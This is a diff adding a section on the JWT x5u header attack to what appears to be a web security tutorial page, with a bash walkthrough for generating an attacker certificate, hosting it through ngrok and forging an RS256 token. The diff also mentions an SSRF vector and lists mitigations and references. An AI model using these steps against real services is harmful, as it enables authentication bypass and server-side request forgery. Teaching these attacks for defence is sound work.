@@ -147,6 +147,32 @@ jku = "http://internal-redis:6379/"`} />
         </ul>
       </ImpactBox>
 
+      <H2>x5u - the X.509 certificate variant</H2>
+      <P>
+        RFC 7515 §4.1.5 defines <Mono>x5u</Mono> (X.509 URL) as the certificate equivalent of <Mono>jku</Mono>.
+        Instead of pointing to a JWKS JSON file, it points to a URL serving an X.509 certificate chain in PEM format.
+        The server fetches the certificates, extracts the public key from the first one, and uses it for verification.
+        The attack is mechanically identical - only the hosted file format changes.
+      </P>
+      <CodeBlock language="bash" label="x5u attack - host a PEM cert instead of JWKS" code={`# Step 1: Generate keypair and self-signed certificate
+openssl genrsa -out attacker.key 2048
+openssl req -new -x509 -key attacker.key -out attacker.crt -days 365 \\
+  -subj "/CN=attacker"
+
+# Step 2: Host the certificate (PEM format)
+python3 -m http.server 8080 &
+ngrok http 8080
+# → https://abc123.ngrok-free.app/attacker.crt
+
+# Step 3: Forge the JWT
+# Header: {"alg":"RS256","x5u":"https://abc123.ngrok-free.app/attacker.crt"}
+# Sign with attacker.key - server fetches cert, extracts public key, verifies → bypass`} />
+      <P>
+        All the domain bypass techniques that apply to <Mono>jku</Mono> (open redirects, @ confusion,
+        fragment tricks, subdomain takeover) apply equally to <Mono>x5u</Mono>. The SSRF vector is also
+        present: the server makes an outbound HTTP request to whatever URL the attacker specifies.
+      </P>
+
       <H2>Mitigations</H2>
       <ul className="refs-list" style={{ fontSize: "14px", color: "var(--text-muted)", lineHeight: 2, marginBottom: "24px" }}>
         <li>Maintain a server-side allowlist of trusted JWKS URLs - pre-configured, not derived from the token</li>
@@ -162,6 +188,7 @@ jku = "http://internal-redis:6379/"`} />
         <ul className="refs-list" style={{ fontSize: "13px", color: "var(--text-muted)", lineHeight: 2 }}>
           <li><Ref href="https://portswigger.net/web-security/jwt/exploiting#injecting-self-signed-jwts-via-the-jku-parameter">PortSwigger - Injecting self-signed JWTs via the jku parameter</Ref></li>
           <li><Ref href="https://www.rfc-editor.org/rfc/rfc7515#section-4.1.2">RFC 7515 §4.1.2 - jku (JWK Set URL) Header Parameter</Ref></li>
+          <li><Ref href="https://www.rfc-editor.org/rfc/rfc7515#section-4.1.5">RFC 7515 §4.1.5 - x5u (X.509 URL) Header Parameter</Ref></li>
           <li><Ref href="https://book.hacktricks.wiki/en/pentesting-web/hacking-jwt-json-web-tokens.html">HackTricks - Hacking JWT Tokens</Ref></li>
           <li><Ref href="https://tools.ietf.org/html/rfc3986">RFC 3986 - Uniform Resource Identifier (URI) syntax</Ref></li>
         </ul>
